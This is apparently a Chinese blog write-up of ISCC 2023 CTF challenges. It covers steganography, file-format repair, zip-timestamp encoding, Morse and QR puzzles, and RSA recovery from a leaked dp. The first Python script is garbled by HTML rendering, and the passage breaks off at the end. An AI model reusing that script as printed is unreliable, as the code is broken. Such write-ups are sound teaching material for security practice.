<h2 id="你相信AI吗？"><a href="#你相信AI吗？" class="headerlink" title="你相信AI吗？"></a>你相信AI吗？</h2><p>将dataset⽂件夹放在与以下这个脚本同⼀个⽂件夹的位置，然后创建⼀个out⽂件夹</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2
<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):
 <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;./dataset/<span class="hljs-subst">&#123;i&#125;</span>.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:
 data = f.read().splitlines()
 image_data = np.array([<span class="hljs-built_in">float</span>(line) <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> data])
 <span class="hljs-comment"># dic = &#123;X: int(image_data.shape[0] / X) for X in range(1, image_data.shape[0]) if</span>
image_data.shape[<span class="hljs-number">0</span>] % X <span class="hljs-string">&quot;# 0&#125;</span>
<span class="hljs-string"> # for width, height in dic.items():</span>
<span class="hljs-string"> if image_data.shape[0] &quot;</span><span class="hljs-comment"># 2352:</span>
 cv2.imwrite(<span class="hljs-string">f&quot;./out/<span class="hljs-subst">&#123;i&#125;</span>.png&quot;</span>, image_data.reshape(<span class="hljs-number">84</span>, <span class="hljs-number">28</span>))
 <span class="hljs-keyword">elif</span> image_data.shape[<span class="hljs-number">0</span>] <span class="hljs-string">&quot;# 1568:</span>
<span class="hljs-string"> cv2.imwrite(f&quot;</span>./out/&#123;i&#125;.png<span class="hljs-string">&quot;, image_data.reshape(56, 28))</span>
<span class="hljs-string"> else:</span>
<span class="hljs-string"> print(i)</span></code></pre>
<p>执⾏完成之后将out⽂件夹中的图⽚中显示的数字按顺序写到cipher_text中以空格隔开</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> string
<span class="hljs-keyword">import</span> itertools
<span class="hljs-keyword">import</span> contextlib
<span class="hljs-keyword">def</span> <span class="hljs-title function_">has_visible_bytes</span>(<span class="hljs-params">input_bytes</span>):
 <span class="hljs-keyword">return</span> <span class="hljs-built_in">all</span>(<span class="hljs-built_in">chr</span>(byte) <span class="hljs-keyword">in</span> string.printable <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> input_bytes)
cipher_text = <span class="hljs-string">&#x27;51 59 75 95 56 46 669 665 59 57 685 73 56 55 685 53 77 685 75 664 25 682</span>
<span class="hljs-string">75 74 22 48 59 78 683 56 96 96&#x27;</span>.split(<span class="hljs-string">&quot; &quot;</span>)<span class="hljs-comment">#修改这个位置的值</span>
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;out.txt&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:
 <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> itertools.permutations(<span class="hljs-string">&quot;0123456789&quot;</span>, <span class="hljs-number">10</span>):
 maktrans = <span class="hljs-built_in">str</span>.maketrans(<span class="hljs-string">&quot;0123456789&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>.join(i))
 lis = [<span class="hljs-built_in">str</span>.translate(i, maktrans) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cipher_text]
 <span class="hljs-keyword">with</span> contextlib.suppress(Exception):
 plan_text = <span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x: <span class="hljs-built_in">int</span>(x), lis)))
 <span class="hljs-keyword">if</span> has_visible_bytes(plan_text):
 <span class="hljs-built_in">print</span>(plan_text)
 f.write(plan_text + <span class="hljs-string">b&quot;\n&quot;</span>)</code></pre>

<h2 id="mystery-of-bits"><a href="#mystery-of-bits" class="headerlink" title="mystery of bits"></a>mystery of bits</h2><p>解压附件有一个key.png，用脚本跑出他的长宽</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii
<span class="hljs-keyword">import</span> struct
 
 
 
crcbp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;key.png&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read()    <span class="hljs-comment">#打开图片</span>
crc32frombp = <span class="hljs-built_in">int</span>(crcbp[<span class="hljs-number">29</span>:<span class="hljs-number">33</span>].<span class="hljs-built_in">hex</span>(),<span class="hljs-number">16</span>)     <span class="hljs-comment">#读取图片中的CRC校验值</span>
<span class="hljs-built_in">print</span>(crc32frombp)
 
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4000</span>):                        <span class="hljs-comment">#宽度1-4000进行枚举</span>
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4000</span>):                    <span class="hljs-comment">#高度1-4000进行枚举</span>
        data = crcbp[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>] + \
            struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, j)+crcbp[<span class="hljs-number">24</span>:<span class="hljs-number">29</span>]
        crc32 = binascii.crc32(data) &amp; <span class="hljs-number">0xffffffff</span>
        <span class="hljs-comment"># print(crc32)</span>
        <span class="hljs-keyword">if</span>(crc32 == crc32frombp):            <span class="hljs-comment">#计算当图片大小为i:j时的CRC校验值，与图片中的CRC比较，当相同，则图片大小已经确定</span>
            <span class="hljs-built_in">print</span>(i, j)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hex:&#x27;</span>, <span class="hljs-built_in">hex</span>(i), <span class="hljs-built_in">hex</span>(j))
            exit(<span class="hljs-number">0</span>)
</code></pre>
<p>为0x438 0x438，修改图片后用stegslove打开<br><img src="https://img-blog.csdnimg.cn/49e1c873c86c42429383d6a2b567079b.png" alt="在这里插入图片描述"><br>找到这个横着看能看出密码是ysafao245hfdisi解压后是一个wav音频文件，用010打开在最后有password为ISCC2023，再用stegpy解密能解出一堆二进制，然后将这些转换成一个长宽为31的二维码</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image
<span class="hljs-keyword">from</span> zlib <span class="hljs-keyword">import</span> *

MAX = <span class="hljs-number">31</span> <span class="hljs-comment"># 数字的长度为一个整数的平方（如36^2=1296)</span>
pic = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(MAX,MAX))
<span class="hljs-built_in">str</span> =<span class="hljs-string">&quotquot;</span>

i=<span class="hljs-number">0</span>
<span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,MAX):
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,MAX):
        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">str</span>[i] == <span class="hljs-string">&#x27;1&#x27;</span>):
            pic.putpixel([x,y],(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))
        <span class="hljs-keyword">else</span>:pic.putpixel([x,y],(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))
        i = i+<span class="hljs-number">1</span>
pic.show()
pic.save(<span class="hljs-string">&quot;flag.png&quot;</span>)
</code></pre>
<p>扫码即为flag</p>
<h2 id="通信方式"><a href="#通信方式" class="headerlink" title="通信方式"></a>通信方式</h2><p>打开附件，是一段音频文件，猜测其中有二进制数据，写个脚本解题</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> scipy.io <span class="hljs-keyword">import</span> wavfile
<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
<span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image
sample_rate, data = wavfile.read(<span class="hljs-string">&#x27;telegram2wechat.wav&#x27;</span>)
left_channel = data[:, <span class="hljs-number">0</span>]
right_channel = data[:, <span class="hljs-number">1</span>]
result = left_channel - right_channel
np.savetxt(<span class="hljs-string">&#x27;array.txt&#x27;</span>,result,fmt=<span class="hljs-string">&#x27;%d&#x27;</span>)
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;array.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:
    file_contents = file.readlines()
file_contents = [<span class="hljs-built_in">int</span>(line.strip()) <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file_contents]
flag = [x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> file_contents <span class="hljs-keyword">if</span> x != <span class="hljs-number">0</span>]
flag_new = <span class="hljs-string">&quot;&quot;</span>
<span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> flag:
    flag_new += <span class="hljs-built_in">str</span>(t)
flag_new = flag_new.replace(<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;0&quot;</span>)
<span class="hljs-built_in">print</span>(flag_new)
MAX = <span class="hljs-number">45</span>
pic = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(MAX,MAX))
i=<span class="hljs-number">0</span>
<span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,MAX):
   <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,MAX):
        <span class="hljs-keyword">if</span>(flag_new[i] == <span class="hljs-string">&#x27;1&#x27;</span>):
            pic.putpixel([x,y],(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))
        <span class="hljs-keyword">else</span>:pic.putpixel([x,y],(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))
        i = i+<span class="hljs-number">1</span>
pic.show()
pic.save(<span class="hljs-string">&quot;flag&quot;</span>)</code></pre>
<p>跑出二维码扫描后得到一堆电码，去在线网站解密<br><img src="https://img-blog.csdnimg.cn/a16e68f154c94065aa93bece285d2db7.png" alt="在这里插入图片描述"><br>挨个读出来得到flag</p>
<h2 id="芝士雪豹"><a href="#芝士雪豹" class="headerlink" title="芝士雪豹"></a>芝士雪豹</h2><p>打开附件，发现附件无法正常打开，先把附件拖进010里看看，发现rar的文件头74被改成了73，把期中的rar文件头先修改回来<br><img src="https://img-blog.csdnimg.cn/e8381e7ea9614e219d2ff37cd8f80808.png" alt="在这里插入图片描述"><br>打开压缩包是一张图片和一个带有加密的压缩包，先修改图片高度，得到了压缩包的密码<br><img src="https://img-blog.csdnimg.cn/65a196b1f55840b9aa931be6e6b5de16.png" alt="在这里插入图片描述"><br>打开压缩包，发现是个套娃，利用python脚本跑出最后一个压缩包<br><img src="https://img-blog.csdnimg.cn/b8cc1c336b33427489fd636356d69232.png" alt="在这里插入图片描述"><br>压缩完后只看见一个0.txt文档，里面写着“hint:something fell on the road,the flag is not at the end ”，再结合一开始的hint证明，flag不是简单压缩完就能得到的。通过观察，发现压缩包的修改日期不同，有两种修改日期。<br><img src="https://img-blog.csdnimg.cn/ee557d326fc14ab7a188521da119012e.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/58fbba62fb6e470bb1cd0ad4c654d58e.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/9333e0d465374a308a43c3a4b7a47d5d.png" alt="在这里插入图片描述"><br>把“2023-05-01 10:13:52”看作“0”，把“2023-05-01 10:13:58”看作“1”，猜测其为二进制加密<br>写python脚本</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile
<span class="hljs-keyword">import</span> os.path, time
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> pyzipper


<span class="hljs-keyword">def</span> <span class="hljs-title function_">TimeStampToTime</span>(<span class="hljs-params">timestamp</span>):
    timeStruct = time.localtime(timestamp)
    <span class="hljs-keyword">return</span> time.strftime(<span class="hljs-string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>, timeStruct)


<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_FileCreateTime</span>(<span class="hljs-params">filePath</span>):
    <span class="hljs-comment"># &#x27;&#x27;&#x27;获取文件的创建时间&#x27;&#x27;&#x27;</span>
    <span class="hljs-comment"># filePath = unicode(filePath,&#x27;utf8&#x27;)</span>
    t = os.path.getctime(filePath)
    <span class="hljs-keyword">return</span> TimeStampToTime(t)


<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_FileModifyTime</span>(<span class="hljs-params">filePath</span>):
    <span class="hljs-comment"># &#x27;&#x27;&#x27;获取文件的修改时间&#x27;&#x27;&#x27;</span>
    <span class="hljs-comment"># filePath = unicode(filePath, &#x27;utf8&#x27;)</span>
    t = os.path.getmtime(filePath)
    <span class="hljs-keyword">return</span> TimeStampToTime(t)


<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_FileAccessTime</span>(<span class="hljs-params">filePath</span>):
    <span class="hljs-comment"># &#x27;&#x27;&#x27;获取文件的访问时间&#x27;&#x27;&#x27;</span>
    <span class="hljs-comment"># filePath = unicode(filePath, &#x27;utf8&#x27;)</span>
    t = os.path.getatime(filePath)
    <span class="hljs-keyword">return</span> TimeStampToTime(t)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_FileSize</span>(<span class="hljs-params">filePath</span>):
    <span class="hljs-comment"># &#x27;&#x27;&#x27;获取文件的大小,结果保留两位小数，单位为MB&#x27;&#x27;&#x27;</span>
    <span class="hljs-comment"># filePath = unicode(filePath,&#x27;utf8&#x27;)</span>
    fsize = os.path.getsize(filePath)
    fsize = fsize / <span class="hljs-built_in">float</span>(<span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">round</span>(fsize, <span class="hljs-number">2</span>)
name = <span class="hljs-string">&#x27;49183-secret.zip&#x27;</span>
num=<span class="hljs-number">49183</span>
out=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)
<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
      fz = zipfile.ZipFile(name)
      fz.extractall()
      <span class="hljs-keyword">for</span> zi <span class="hljs-keyword">in</span> fz.infolist():
          fz.extract(zi)
          date_time = time.mktime(zi.date_time + (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>))
          os.utime(zi.filename, (date_time, date_time))
          m=get_FileModifyTime(zi.filename)
          <span class="hljs-built_in">print</span>(m)
      fz.close()
      <span class="hljs-keyword">if</span> m==<span class="hljs-string">&#x27;2023-05-01 10:13:52&#x27;</span>:
         out.write(<span class="hljs-string">&#x27;0&#x27;</span>)
      <span class="hljs-keyword">else</span>:
         out.write(<span class="hljs-string">&#x27;1&#x27;</span>)
      num=num-<span class="hljs-number">1</span>
      path=name
      name = <span class="hljs-built_in">str</span>(num)+<span class="hljs-string">&#x27;-secret.zip&#x27;</span>
      fz.close()
      os.remove(path)
</code></pre>

<p>跑完后得到一堆2进制数据，去在线网址上，将2进制转换为16进制文件。<br><img src="https://img-blog.csdnimg.cn/45ae78d425fc4150936acf6cd7b1de14.png" alt="在这里插入图片描述"><br>将文件导出后，拖进010查看格式，发现是gz格式文件头，解压后得到一个图片<br><img src="https://img-blog.csdnimg.cn/b21c47031a59462fba7e07458bd2e733.png" alt="在这里插入图片描述"><br>使用imageIN解密得到flag.txt文档<br><img src="https://img-blog.csdnimg.cn/8c8575d869b94bee8ff3bb1461ca5edb.png" alt="在这里插入图片描述"><br>去在线解密网站解密得到flag<br><img src="https://img-blog.csdnimg.cn/f93e6c96f335490d87ed623d9f1971e3.png" alt="在这里插入图片描述"></p>
<h2 id="哦？摩斯密码？"><a href="#哦？摩斯密码？" class="headerlink" title="哦？摩斯密码？"></a>哦？摩斯密码？</h2><p>打开附件，发现每个文件夹里有三个二维码，扫描后是摩斯密码，利用脚本扫描所有摩斯密码<br><img src="https://img-blog.csdnimg.cn/26e2f27fbb0c4e5387e7d3781044e5b5.png" alt="在这里插入图片描述"><br>将扫出来的结果字频统计一下<br><img src="https://img-blog.csdnimg.cn/1d68f377916a41c4b9ec6f2257362125.png" alt="在这里插入图片描述"><br>得到明文“this is no flag”,观察所有flag的图片是相同的，但是图片的名字不同，有1.png、2.png和3.png，根据题目联想到摩斯密码，讲1.png看成. ，2.png看成-，3.png看成分割，写出脚本跑出摩斯密码<br><img src="https://img-blog.csdnimg.cn/15c70f4eda0c4f4bb1217f50cda8a178.png" alt="在这里插入图片描述"><br>将跑出的摩斯密码去网站在线解密后，得到二进制数据<br><img src="https://img-blog.csdnimg.cn/3038c21cd921488aacb916317f0e8383.png" alt="在这里插入图片描述"><br>7位二进制得到密文<br><img src="https://img-blog.csdnimg.cn/ad36f5d1af454aa98c3dca3f0e8d3ce0.png" alt="在这里插入图片描述"><br>去AES解密在线网站，输入密码“th1sn0flag”解密，得到flag<br><img src="https://img-blog.csdnimg.cn/d64d5d7b2c2e441494cf40fce4317464.png" alt="在这里插入图片描述"></p>
<h2 id="Brain-Game"><a href="#Brain-Game" class="headerlink" title="Brain Game"></a>Brain Game</h2><p>下载附件是个用AAencode加密的压缩包，密码在压缩包右边，把？改为 ﾟ 后得到密码<br>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //<em>´∇｀</em>/ [‘<em>‘]; o=(ﾟｰﾟ)  =</em>=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^<em>^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: ‘</em>‘ ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +’<em>‘) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ ‘</em>‘)[o^<em>^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +’</em>‘)[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +’<em>‘) [c^_^o];(ﾟДﾟ) [‘c’] = ((ﾟДﾟ)+’</em>‘) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [‘o’] = ((ﾟДﾟ)+’<em>‘) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [‘c’]+(ﾟДﾟ) [‘o’]+(ﾟωﾟﾉ +’</em>‘)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +’<em>‘) [ﾟｰﾟ] + ((ﾟДﾟ) +’</em>‘) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +’<em>‘) [ﾟΘﾟ]+((ﾟｰﾟ==3) +’</em>‘) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [‘c’]+((ﾟДﾟ)+’<em>‘) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [‘o’]+((ﾟｰﾟ==3) +’</em>‘) [ﾟΘﾟ];(ﾟДﾟ) [‘<em>‘] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +’</em>‘) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+’<em>‘) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +’</em>‘) [o^<em>^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +’</em>‘) [ﾟΘﾟ]+ (ﾟωﾟﾉ +’<em>‘) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=’\‘; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +’</em>‘)[c^<em>^o];(ﾟДﾟ) [ﾟoﾟ]=’&quot;‘;(ﾟДﾟ) [‘</em>‘] ( (ﾟДﾟ) [‘<em>‘] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (‘</em>‘);</p>
<p>打开压缩包后，是一张图片<br><img src="https://img-blog.csdnimg.cn/8bcc851d4b024a60bae9ec76ab06b205.png" alt="在这里插入图片描述"><br>根据碎裂痕迹，对应到键盘上为“135780”，先用“135780”，cloacked-pixel解密，解不出来有用数据，密码不正确，再看图片，如果按照裂痕先后的思路，后出现的裂痕会在碰到前面出现的裂痕后停止，得到顺序“570831”，再去cloacked-pixel解密<br><img src="https://img-blog.csdnimg.cn/0bb19682ff194f0c89341f4bb87c7886.png" alt="在这里插入图片描述"><br>得到一段数据，经过尝试后，发现先form hex 再to base85就能得到flag<br><img src="https://img-blog.csdnimg.cn/0474675dfd5243998b4d5da7d851507c.png" alt="在这里插入图片描述"></p>
<h2 id="Guess-RSA"><a href="#Guess-RSA" class="headerlink" title="Guess RSA"></a>Guess RSA</h2><p>附件给了公钥，先脚本解出n和e</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA
<span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> PKCS1_OAEP
<span class="hljs-keyword">from</span> numpy <span class="hljs-keyword">import</span> long

public = RSA.importKey(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;pub&#x27;</span>).read())
n = long(public.n)
e = long(public.e)
<span class="hljs-built_in">print</span>(n)
<span class="hljs-built_in">print</span>(e)

n= <span class="hljs-number">141290037064947566206529132717181370698234864868642699047557973411457219735533077057541763794458453776854205535054584663279827865601322416203933147042933586981716703290143924844104156938834839095947246954751648421206411462640039984758358072222401824528712347742351563547663982933462992608020341150998418481469</span>
e= <span class="hljs-number">65537</span></code></pre>
<p>再将附件给的三个明文换成进制</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2
<span class="hljs-keyword">import</span> libnum

<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;cryptotext3.txt&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f1:
    c1 = f1.read()
    c1 = libnum.s2n(c1)
<span class="hljs-built_in">print</span>(c1)</code></pre>
<p>得到数据:<br>c1= 15675664162517005241985334850747322279876279456574700862907552681481377133185544579989247038799479171776327240780404882118904537725766312056443466295064750703372005792416973033030771437551025381553764003235556081094078622478104365189796833112914604071350200351731894133093904945300457608647456120613115797620<br>c2= 140861103274216455230721845501898308648236818144495265653434927079070691530723508171403973717514275151780171294904394774518093215002953258888100585054189890096052341414700257111375220034066504715553430076834975116291241799793991901777387974579764040747570218791785702867501258811622798523769676652686058178795<br>c3= 99529796079917923667416703621596340605976154418748680997166709360261843180294998507573349072387930043122958288285449187996957718834900637362680133270163491814007472682256839243994660305780477877832077377778094226956503797223980753581850455217835856249465622909655714810911375056415139213238490343537769816334</p>
<p>图片的pic.png使用zsteg发现16进制，把它看作dp，转换一下得到<br>Dp=<br>0x381044a04c6c66078e89668fd73cb82c4f10161be4c6f3a12781698d00efba838cdb4b4373bd72ebdca49a6470e59f9fb8413a3b2ac7ac850f176c4d65ef7ab5</p>
<p>已知n、e、c、dp，利用软件依次解出3个明文<br><img src="https://img-blog.csdnimg.cn/30dadcd55aff47cca9135ee209be2d24.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/40c8645146d7431cb1e0aceb18958a03.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/0d2af007403f4be29a9fe47967167cbe.png" alt="在这里插入图片描述"><br>拼接三个flag部分得到flag：ISCC{iu5a!ui<em>3qehbca@90&amp;rhic+hj69at8v</em>r346z9(byawa5t0vr35-vr^if89%hu}</p>
<h2 id="听你心跳里的狂"><a href="#听你心跳里的狂" class="headerlink" title="听你心跳里的狂"></a>听你心跳里的狂</h2><p>下载附件，利用veracrypt，将音频文件作为秘钥文件挂载<br>打开磁盘得到一个加密的压缩包，用010打开，发现文件尾，有32字节字符<br><img src="https://img-blog.csdnimg.cn/477d75aa69cb4810ba5f332196014979.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/ed2c6a580fce4c6990960c479fe66b77.png" alt="在这里插入图片描述"><br>利用rot13和rot47，解出一串md5字符串<br>在网站中解出压缩包的密码为 Logistic<br>解得png文件，但文件结构不对，无法打开，16进制为乱码。将文件头与png文件头逐字节异或发现得到都是0x15，将整个文件与0x15异或得到原png文件<br><img src="https://img-blog.csdnimg.cn/e7ac33705ac84076ad144d8014bfd287.png" alt="在这里插入图片描述"><br>将图片反色后，隐约在左上角看见flag的字样<br><img src="https://img-blog.csdnimg.cn/c1eab5c88c6c41c49de1d703e9f7ae10.png" alt="在这里插入图片描述"><br>经过不断的尝试，和硬看，终于得到flag，flag为：ISCC{GQQ_w4nt_eAt_f1sh !!}</p>
<h2 id="G9的钢琴曲"><a href="#G9的钢琴曲" class="headerlink" title="G9的钢琴曲"></a>G9的钢琴曲</h2><p>打开附件，发现是一道做过的密码题，把之前的脚本改改，解出密码。<br><img src="https://img-blog.csdnimg.cn/15737b664fdb49b5a5c66b14707a5cb6.png" alt="在这里插入图片描述"><br>解出密码 ISCC_Y0u_R3alLy_KnOw_CoPPersm1th， 打开文件后，是一个hint文件和一个压缩包<br>使用命令进行Cloakify解密，得到一个wav文件<br><img src="https://img-blog.csdnimg.cn/100b96b306094a13a782078fb2736d0b.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/f8ace86ac2124c71ae2c89cdd10d6455.png" alt="在这里插入图片描述"><br>用010打开后发现有明显的二进制数据迹象，利用python脚本把- +，改为0和1得到二进制数据<br><img src="https://img-blog.csdnimg.cn/7de01cbb28e546fba7b5dc38442d221d.png" alt="在这里插入图片描述"><br>再解密这些二进制数据，即可得到flag</p>
<h2 id="BNG"><a href="#BNG" class="headerlink" title="BNG"></a>BNG</h2><p>利用两个脚本跑出图片和隐写位置的数据，一个是这篇博客中的脚本：<br><a href="https://www.cnblogs.com/kentle/p/14725589.html">https://www.cnblogs.com/kentle/p/14725589.html</a><br><img src="https://img-blog.csdnimg.cn/6684fa35afdc4a38acc5a9b0d0a3b4fa.png" alt="在这里插入图片描述"><br>和这个bng转换脚本<br><img src="https://img-blog.csdnimg.cn/47a1887f493c45e5bdb94855c59559e1.png" alt="在这里插入图片描述"><br>图片和隐写位置数据分别为<br><img src="https://img-blog.csdnimg.cn/248a0ae738734ff4b18dd633e32354f9.png" 